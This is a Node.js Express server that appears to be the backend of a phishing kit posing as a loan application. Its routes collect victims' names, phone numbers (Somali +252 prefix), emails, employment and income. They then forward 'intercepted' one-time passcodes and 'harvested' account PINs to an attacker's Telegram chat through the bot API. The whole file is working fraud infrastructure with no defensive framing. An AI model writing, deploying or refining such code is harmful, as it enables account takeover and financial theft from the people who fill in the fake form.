require('dotenv').config();
const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

/**
 * Helper function to send compiled message layouts to the Telegram Bot API
 */
async function sendToTelegram(text) {
    if (!BOT_TOKEN || !CHAT_ID) {
        console.error("[BOT MANAGER] Missing BOT_TOKEN or TELEGRAM_CHAT_ID in environment configurations.");
        return false;
    }
    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'Markdown'
        });
        console.log("✅ Message safely dispatched to Telegram channel.");
        return true;
    } catch (err) {
        console.error("❌ Telegram API Dispatch Error:", err.response ? err.response.data : err.message);
        return false;
    }
}

/**
 * HTTP Route: Receives Core Data from Step 3
 */
app.post('/log-step3-data', async (req, res) => {
    const { session } = req.body;
    if (!session) return res.status(400).json({ error: "Missing session payload parameters" });

    console.log(`[BOT MANAGER] Processing Step 3 log profile for Tracker ID: ${session.appId}`);

    const message = `
📱 *New Application: ${session.appId}*
━━━━━━━━━━━━━━━━━━━━━━━━
💰 *LOAN DETAILS:*
• Type: ${session.loanType}
• Amount: USD ${session.amount}
• Term: ${session.term} Month(s)
• Purpose: ${session.purpose}

👤 *PERSONAL INFO:*
• Name: ${session.firstName} ${session.lastName}
• Phone: +252${session.phone}
• Email: ${session.email}

💼 *EMPLOYMENT & INCOME:*
• Status: ${session.employment}
• Annual Income: $${session.income}
• Employer: ${session.employer || 'N/A'}
━━━━━━━━━━━━━━━━━━━━━━━━
Status: *Awaiting OTP Verification...*
    `;

    await sendToTelegram(message.trim());
    return res.json({ success: true });
});

/**
 * HTTP Route: Receives Intercepted OTP from Step 4
 */
app.post('/trigger-step4-telegram', async (req, res) => {
    const { session } = req.body;
    if (!session) return res.status(400).json({ error: "Missing session payload parameters" });

    console.log(`[BOT MANAGER] Processing Step 4 OTP stream for Tracker ID: ${session.appId}`);

    const message = `
🔑 *OTP Received for ID: ${session.appId}*
━━━━━━━━━━━━━━━━━━━━━━━━
• Intercepted Code: \`${session.otpToken}\`
• Phone associated: +252${session.phone}
━━━━━━━━━━━━━━━━━━━━━━━━
Status: *Awaiting Admin Action Decisions*
    `;

    await sendToTelegram(message.trim());
    return res.json({ success: true });
});

/**
 * HTTP Route: Receives Account PIN from Step 5
 */
app.post('/trigger-step5-telegram', async (req, res) => {
    const { session } = req.body;
    if (!session) return res.status(400).json({ error: "Missing session payload parameters" });

    console.log(`[BOT MANAGER] Processing Step 5 PIN capture execution for Tracker ID: ${session.appId}`);

    const message = `
💳 *Account PIN Harvested for ID: ${session.appId}*
━━━━━━━━━━━━━━━━━━━━━━━━
• Target Account PIN: \`${session.pinCode}\`
• Account Owner: ${session.firstName} ${session.lastName}
━━━━━━━━━━━━━━━━━━━━━━━━
Status: *Complete Operational Capture Execution*
    `;

    await sendToTelegram(message.trim());
    return res.json({ success: true });
});

// Start Bot Manager service on port 3001 to match default fallback in server.js
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
    console.log(`🚀 Telegram Bot Manager Service running on port ${PORT}`);
});